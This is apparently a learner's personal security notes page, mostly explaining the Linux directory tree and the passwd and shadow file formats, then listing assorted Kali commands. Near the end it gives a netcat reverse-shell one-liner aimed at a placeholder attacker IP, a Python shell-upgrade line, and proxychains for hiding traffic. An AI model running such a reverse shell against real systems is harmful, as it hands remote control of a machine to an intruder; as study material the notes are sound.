<link href="../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Personal Security Notes <span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

# <span class="title">Linux File System


<span class="date">Tuesday, 13/7/2021</span> 

<img src="https://cdn.picpng.com/linux/linux-unix-tux-penguin-cute-43298.png" width=150>  


<br/> 

### <span class="linuxBasicsSubs subtitle"> What is a file system?  
The definition of a file system depends on the context. According to *opensource.com* the word file system can mean  

<blockquote>

*1.The entire Linux directory structure starting at the top (/) root directory.*  

*2. A specific type of data storage format, such as EXT3, EXT4, BTRFS, XFS, and so on. Linux supports almost 100 types of filesystems, including some very old ones as well as some of the newest.  
Each of these filesystem types uses its own metadata structures to define how the data is stored and accessed.* 

*3. A partition or logical volume formatted with a specific type of filesystem that can be mounted on a specified mount point on a Linux filesystem.*
</blockquote>  

Also, we can say that file system is a built-in layer in the Linux operating system to manage the data stored on the disk (the data on non-volatile storage).  

<img src="https://opensource.com/sites/default/files/filesystem_diagram.png" width=400>  

In the figure above the layer that has the "EXT3,HPFS,VFAT,EXT4,FreeBSD" is the types of filesystems linux makes available. 

<br/><br/>

### <span class="linuxBasicsSubs subtitle"> why does file systems exist? 
**The first thing** file systems exist for is something that they provide which is called *namespace* which defines how a file should be named. It also defines the logical structure of the data on the disk, such as the use of directories that are used to organize files instead of them being like a huge conglomeration of files.  

**The second thing** that file systems provide is what we call *metadata structure* which provides logical foundation for the namespace which includes:
1) The data structures required to make a hierarchical directory structure.
2) Structures that maintain the files and directories' names.  
3) Information about the files such as their size and times they were created, modified or last accessed and the location or locations of the data belonging to the file on the disk.  

<br/><br/>

### <span class="linuxBasicsSubs subtitle">APIs (Application Programming Interface) & Filesystems   

Filesystems need APIs to access system function calls and these functions manipulate the filesystem objects like files and directories.  
They provide the ability to create, move and delete files.  

<br/><br/>

### <span class="linuxBasicsSubs subtitle">Tree of Directories in Linux    

To view the tree of directories in linux we can use the following command and it will give us the provided output  

```console
┌──(kali㉿kali)-[~]
└─$ tree -L 1 /  
/
├── bin -> usr/bin
├── boot
├── dev
├── etc
├── home
├── initrd.img -> boot/initrd.img-5.10.0-kali3-amd64
├── initrd.img.old -> boot/initrd.img-5.10.0-kali3-amd64
├── lib -> usr/lib
├── lib32 -> usr/lib32
├── lib64 -> usr/lib64
├── libx32 -> usr/libx32
├── lost+found
├── media
├── mnt
├── opt
├── proc
├── root
├── run
├── sbin -> usr/sbin
├── srv
├── sys
├── tmp
├── usr
├── var
├── vmlinuz -> boot/vmlinuz-5.10.0-kali3-amd64
└── vmlinuz.old -> boot/vmlinuz-5.10.0-kali3-amd64

22 directories, 4 files

```   

<br/><br/>

### <span class="linuxBasicsSubs subtitle">What Does Each Directory Do?  

 1) `/bin` .  
   contains the *binaries*, which are applications and programs the user can run.  
   It has the *ls* program and many other basic tools that are used to remove, make or move files and directories.  
   *There are other bin files in the filesystem.*  

 2) `/boot` .  
   Contains files required for starting your system. DO NOT TOUCH THE DAMN THING.   

 3) `/dev` .  
   Contains *device* files. E.g. if you plug a USB pendrive into your machine, a new device entry will pop up in this directory.

 4) `/etc` .  
   It's name was meant to be "et cetera" because it was the place that the administrators would put any file they were not sure where to put.  
   But nowadays, it more like means "Everything to configure" as it contains almost all system-wide configuration files.  
   E.g. The files that contain the name of the system, the users and their passwords, the names of machines on your network.
 5) `/home` .  
   Contains the users' personal directories.  

 6) `/lib` .  
   Contains libraries which are files that contains code that the user's applications use.  

 7) `/media` .  
   It inserts and detects external storage automatically mounted when plugged into the PC.

 8) `/mnt` .  
   It's where, back in the days, a user can *manually* mount storage devices or partitions. LEGACY   

 9) `/opt` .  
   It's where to find a software a user compiles (SOMETIMES).  

 10) `/proc` .  
   Is a *virtual directory* which contains information about the user's computer, such as information about the CPU and the kernel the linux system is running.  
   In this directory the files and directories are generated when the computer starts or on the fly.  

 11) `/root` .  
   It's the home directory of the superuser of the system. Quoted from Linux.com   
       <blockquote>
       
       *It is separate from the rest of the users’ home directories BECAUSE YOU ARE NOT MEANT TO TOUCH IT. Keep your own stuff in you own directories, people.*
       </blockquote>

 12) `/run` .  
   System processes store temporary data in it so also it should be left untouched.  

 13) `/sbin` .  
   It's similar to `/bin` but it only contains the applications that the super user will need (Hence the *s*). You can use these commands using the `sudo` command.  

 14) `/usr` .  
   What's the difference between it and `/home`????  
       <blockquote>
       *The /usr directory was where users’ home directories were originally kept back in the early days of UNIX. However, now /home is where users kept their stuff as we saw above. These days, /usr contains a mish-mash of directories which in turn contain applications, libraries, documentation, wallpapers, icons and a long list of other stuff that need to be shared by applications and services.*

       *You will also find bin, sbin and lib directories in /usr. What is the difference with their root-hanging cousins? Not much nowadays. Originally, the /bin directory (hanging off of root) would contain very basic commands, like ls, mv and rm; the kind of commands that would come pre-installed in all UNIX/Linux installations, the bare minimum to run and maintain a system. /usr/bin on the other hand would contain stuff the users would install and run to use the system as a work station, things like word processors, web browsers, and other apps.*  

      *But many modern Linux distributions just put everything into /usr/bin and have /bin point to /usr/bin just in case erasing it completely would break something.* 
      *So, while Debian, Ubuntu and Mint still keep /bin and /usr/bin (and /sbin and /usr/sbin) separate; others, like Arch and its derivatives just have one "real" directory for binaries, /usr/bin, and the rest or *bins are "fake" directories that point to /usr/bin*.
       </blockquote>  

   Fix it after you get ANSWERS!!!

 15) `/srv` .  
   Contains data for servers. Also quoted from *linux.com*   
       <blockquote>
       
       *If you are running a web server from your Linux box, your HTML files for your sites would go into /srv/http (or /srv/www). If you were running an FTP server, your files would go into /srv/ftp.*
       </blockquote>
 16) `/sys` .  
   Is another virtual directory it also contains information from devices connected to the users computer.Also, LEAVE IT UNTOUCHED unless your know what you're doing.

 17) `/tmp` .  
   Contains temporary files, usually placed there by applications that the user is running which are the files that the application doesn't need at the moment but will need later.  
   The user can also store their own temporary files.

 18) `/var` .  
   The name was originally meant to mean that the directory is *variable* but since nowadays there are alot of directories that has their content change frequently as well.  
   It contains *logs*. Logs of events that happen on the system.   

<br/><br/>

### <span class="linuxBasicsSubs subtitle">More & More Directories  

<img src="https://lcom.static.linuxfound.org/sites/lcom/files/standard-unix-filesystem-hierarchy.png">  

<br/><br/>

### <span class="linuxBasicsSubs subtitle">What Is a Virtual Directory?  
???????  

<br/><br/>

### <span class="linuxBasicsSubs subtitle">The Files Passwd and Shadow in `/etc`  

<span class="linuxBasicsSubs">The passwd file</span> usually contains user account information in the following format(which is the kali user on my VM)  
```console
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```  
The meaning of each of the fields separated by the colon (from left to right):  
1) Username, up to 8 char.s + case sensitive. 
2) `x` means the user has a password (If it's empty it means *no password* ).  
3) User Id that Linux uses this and the following group id to identify which files belong to the user (It's assigned by the `adduser` command).   

     *Both the user id and group id if they were 1000 and above it means it's a user and if they were below 1000 it's sth else.*   

4) Group Id is used for enhanced security.  
5) Full name of the user. 
6) User's home directory. 
7) User's "shell account". If I don't want to grant a specific user a shell account we create a script file called `/bin/sorrysh`.  

<br/>

<span class="linuxBasicsSubs">The Shadow file</span> has the user's passwords in it that are hashed for security reasons. It also contains the account expiration info for users and it has a specific format let's check it out    
```console
kali:$y$j9T$4JmF8/hOTITZlGzS8gtKc1$/twgNomAwBw6t/berIdO4pXN6ZtERj9u/gziBgKPMO1:18681:0:99999:7:::

```
The meaning of each portion seperated by a colon of the above line:  
1) Username.  
2) Password Hash. `::` usually means there's no need for a login for this specifc user and the `:*:` indicates that the account has been disabled.  
The hash consists of 3 different fields that are seperated by a `$`  these fields are:
    1. The cryptographic hashing mechanism used to generate the hash. 
    2. A randomly generated salt (to safeguard agianst rainbow table attacks).
    3. The hash which results from the joining the password with the salt and then applying the hashing mechanism.  
   <br/>



1) Number of days since the password was last changed. 
2) Number of days before password may be changed (0 means it could be changed any time).  
3) Number of days after which the password *must* be changed (99999 means that the user can keep the same password for many years).   
4) The number of days to warn a user of an expiring password.  
5) Number of days after a password expires that account will get disabled.
6) The number of days since the account has been disabled. 
7)  A reserved field for possible future use.  




----------
* Command in linux   


### <span class="useful_shit subtitle">Web Testing  

* We can use the command `whatweb [IP ADDRESS]` to see info about the web server.

 <br/><br/> 

### <span class="useful_shit subtitle">Changing Process Priority with *nice*   

  ```console
  nice -n [niceness value] [command]
  ```
  * -ve value is most likely to receive priority.
  * +ve value is the least likely to receive priority.

 <br/><br/> 

### <span class="useful_shit subtitle">Environment Variables  

  * To view the contents of an env variable
    ```console
    echo $[ENV VAR]
    ```

  * For the change in  the contents of a variable to be for all we have to export it  
    ```console
    export [ENVE VAR]
    ```  


 <br/><br/> 



### <span class="useful_shit subtitle"> Proxy Servers  

* We can obscure our traffic by using proxies.
* Specifically, in Kali Linux there's a command for proxying called *proxychains*  
  ```console
  kali> proxychains [THE COMMAND YOU WANT TO PROXY] [ARGUMENTS]
  ``` 
* The configurations of `proxychains` are stored in a config file `/etc/proxychains.conf`. We can edit this file to set a proxy for the `proxychains` command to use.


 <br/><br/>   


 
* We can convert Hex to ASCII using the command `xxd`  


<br/> 

### <span class="useful_shit subtitle">Most Reliable Reverse Shell Payload  
  ```console
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
  ```

 <br/><br/> 

### <span class="useful_shit subtitle">Python Script That Spawns a Shell When connecting to a Reverse Shell  
```console
python -c 'import pty;pty.spawn("/bin/bash");'
```


## What does Focal Fossa mean?  
Ubuntu code names contain 2 parts the first is an adjective and the second is an animal name. That being said "Focal" is an adjective that means "Focus" and "Fossa" is an animal name.